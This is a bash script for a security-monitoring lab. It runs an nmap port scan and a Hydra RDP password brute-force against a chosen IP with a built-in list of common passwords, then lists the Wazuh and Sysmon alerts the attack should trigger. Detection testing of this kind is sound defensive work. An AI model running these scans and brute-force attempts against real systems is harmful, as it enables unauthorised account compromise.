#!/usr/bin/env bash
# ==============================================================================
# Script: attack-simulation.sh
# Author: Sandeep Mothukuri
# Description: Automated & Interactive Attack Simulation Script for SOC Detection Lab.
#              Simulates Network Reconnaissance (Nmap) and RDP Brute-Force (Hydra)
#              to generate high-fidelity security events for Wazuh & Sysmon telemetry.
# MITRE ATT&CK: T1046 (Network Service Scanning), T1110.001 (Password Guessing)
# ==============================================================================

set -euo pipefail

# ANSI Color Codes for Terminal Output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default Configuration
TARGET_IP=""
TARGET_PORT="3389"
USERNAME="Administrator"
WORDLIST=""
MODE="all"
THREADS=4

print_banner() {
    echo -e "${BLUE}"
    echo "=================================================================="
    echo "       SOC DETECTION & THREAT HUNTING LAB - ATTACK SIMULATION     "
    echo "       Author: Sandeep Mothukuri (Senior SOC Analyst L3)          "
    echo "=================================================================="
    echo -e "${NC}"
}

log_info() {
    echo -e "${GREEN}[+] INFO:${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!] WARNING:${NC} $1"
}

log_err() {
    echo -e "${RED}[x] ERROR:${NC} $1" >&2
}

usage() {
    cat <<EOF
Usage: $0 -t <TARGET_IP> [-p <PORT>] [-u <USERNAME>] [-w <WORDLIST>] [-m <MODE>]

Options:
  -t <ip>        Target Windows VM IP address (Required)
  -p <port>      Target RDP port (Default: 3389)
  -u <user>      Target username for brute-force (Default: Administrator)
  -w <file>      Path to custom password dictionary (Optional)
  -m <mode>      Simulation mode: 'recon', 'bruteforce', 'all' (Default: all)
  -h             Show this help message

Example:
  $0 -t 192.168.56.10 -m all
  $0 -t 192.168.56.10 -u victim -m bruteforce -w /usr/share/wordlists/rockyou.txt
EOF
    exit 1
}

# Parse Command-Line Options
while getopts "t:p:u:w:m:h" opt; do
    case "${opt}" in
        t) TARGET_IP="${OPTARG}" ;;
        p) TARGET_PORT="${OPTARG}" ;;
        u) USERNAME="${OPTARG}" ;;
        w) WORDLIST="${OPTARG}" ;;
        m) MODE="${OPTARG}" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "${TARGET_IP}" ]]; then
    log_err "Target IP address is required."
    usage
fi

check_dependencies() {
    log_info "Verifying required simulation utilities..."
    local missing=0

    if ! command -v nmap &>/dev/null; then
        log_err "nmap is not installed. Run: sudo apt-get install -y nmap"
        missing=1
    fi

    if ! command -v hydra &>/dev/null; then
        log_err "hydra is not installed. Run: sudo apt-get install -y hydra"
        missing=1
    fi

    if [[ ${missing} -ne 0 ]]; then
        exit 1
    fi
    log_info "All prerequisite tools are installed."
}

generate_temp_wordlist() {
    local tmp_file
    tmp_file=$(mktemp /tmp/soc_lab_passwords.XXXXXX)
    cat <<'PASSWORDS' > "${tmp_file}"
Password123!
Summer2024!
Welcome2025!
Admin@12345
Spring2026!
P@ssw0rd2024
Winter2025!
Company@2026
TestAccount1!
SuperSecret!
WrongPass123
Security@987
PASSWORDS
    echo "${tmp_file}"
}

run_reconnaissance() {
    echo ""
    echo -e "${CYAN}------------------------------------------------------------------${NC}"
    echo -e "${CYAN}PHASE 1: Network Reconnaissance & Port Scanning (MITRE T1046)${NC}"
    echo -e "${CYAN}------------------------------------------------------------------${NC}"
    log_info "Target: ${TARGET_IP}:${TARGET_PORT}"
    log_info "Executing TCP SYN scan and service interrogation..."

    nmap -sS -sV -p "${TARGET_PORT}" -Pn --open "${TARGET_IP}" || true

    log_info "Phase 1 complete. Inbound network connections generated."
    log_info "Expected Telemetry: Sysmon Event ID 3 (Network Connection to port ${TARGET_PORT})"
}

run_bruteforce() {
    echo ""
    echo -e "${CYAN}------------------------------------------------------------------${NC}"
    echo -e "${CYAN}PHASE 2: RDP Authentication Brute-Force (MITRE T1110.001)${NC}"
    echo -e "${CYAN}------------------------------------------------------------------${NC}"
    log_info "Target Host    : ${TARGET_IP}"
    log_info "Target Port    : ${TARGET_PORT}"
    log_info "Target Account : ${USERNAME}"

    local wordlist_path="${WORDLIST}"
    local is_temp=0

    if [[ -z "${wordlist_path}" ]] || [[ ! -f "${wordlist_path}" ]]; then
        log_warn "No valid wordlist provided. Generating calibrated simulation wordlist..."
        wordlist_path=$(generate_temp_wordlist)
        is_temp=1
    fi

    log_info "Using password candidate dictionary: ${wordlist_path}"
    log_info "Launching Hydra RDP attack simulation..."

    # Launch Hydra against target RDP service
    hydra -t "${THREADS}" -V -l "${USERNAME}" -P "${wordlist_path}" rdp://"${TARGET_IP}":"${TARGET_PORT}" || true

    if [[ ${is_temp} -eq 1 ]]; then
        rm -f "${wordlist_path}"
    fi

    log_info "Phase 2 complete. High-frequency failed authentication events generated."
    log_info "Expected Telemetry: Windows Security Event ID 4625 (Logon Type 10) & Wazuh Rule 100003"
}

summary() {
    echo ""
    echo -e "${GREEN}==================================================================${NC}"
    echo -e "${GREEN}                 SIMULATION RUN COMPLETED                        ${NC}"
    echo -e "${GREEN}==================================================================${NC}"
    log_info "Verification Steps in Wazuh Dashboard:"
    echo "  1. Navigate to: Security Events -> Explore -> Discover"
    echo "  2. Search Query: data.win.system.eventID: \"4625\""
    echo "  3. Verify Custom Rule Alert: rule.id: \"100003\" (Potential RDP Brute-Force)"
    echo "  4. Cross-reference Sysmon: data.win.system.eventID: \"3\" AND data.win.eventdata.destinationPort: \"${TARGET_PORT}\""
    echo ""
}

main() {
    print_banner
    check_dependencies

    case "${MODE}" in
        recon)
            run_reconnaissance
            ;;
        bruteforce)
            run_bruteforce
            ;;
        all)
            run_reconnaissance
            run_bruteforce
            ;;
        *)
            log_err "Unknown mode: ${MODE}. Valid modes: recon, bruteforce, all."
            exit 1
            ;;
    esac

    summary
}

main
